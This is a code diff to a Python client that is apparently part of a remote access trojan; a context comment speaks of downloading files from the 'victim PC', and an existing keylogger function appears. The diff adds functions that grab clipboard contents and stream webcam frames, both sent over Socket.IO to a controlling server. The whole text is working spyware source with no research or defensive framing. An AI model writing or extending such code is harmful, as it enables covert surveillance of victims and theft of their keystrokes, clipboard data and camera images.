@@ -4,9 +4,11 @@ import os
 import time
 import wave
 
+import cv2
 import keyboard
 import pyaudio
 import pyautogui
+import pyperclip
 from PIL import Image
 
 
@@ -81,6 +83,46 @@ def record_and_send_keyboard_log(duration=10, sio=None):
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
+
+
+def get_clipboard_content(sio=None):
+    try:
+        print("Récupération du presse-papiers...")
+        clipboard_content = pyperclip.paste()
+        if clipboard_content and sio:
+            sio.emit('clipboard_response', {'clipboard_content': clipboard_content})
+            print("Contenu du presse-papiers envoyé au serveur via Socket.IO.")
+        else:
+            print("Aucun contenu trouvé dans le presse-papiers ou connexion au serveur Socket.IO manquante.")
+    except Exception as e:
+        print(f"Échec de la récupération du presse-papiers: {e}")
+
+
+def gen_frames(sio):
+    try:
+        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using DirectShow
+        if not camera.isOpened():
+            raise ValueError("Failed to open webcam")
+
+        while True:
+            success, frame = camera.read()
+            if not success:
+                print("Failed to read frame from webcam")
+                break
+            else:
+                ret, buffer = cv2.imencode('.jpg', frame)
+                if not ret:
+                    print("Failed to encode frame")
+                    continue
+                frame_bytes = base64.b64encode(buffer)
+                sio.emit('webcam_response', {'data': frame_bytes.decode()})
+
+    except Exception as e:
+        print(f"Failed to initialize or read from webcam: {e}")
+    finally:
+        if 'camera' in locals() and camera.isOpened():
+            camera.release()
+        cv2.destroyAllWindows()
 
 
 #Télécharger des fichiers depuis le pc victime
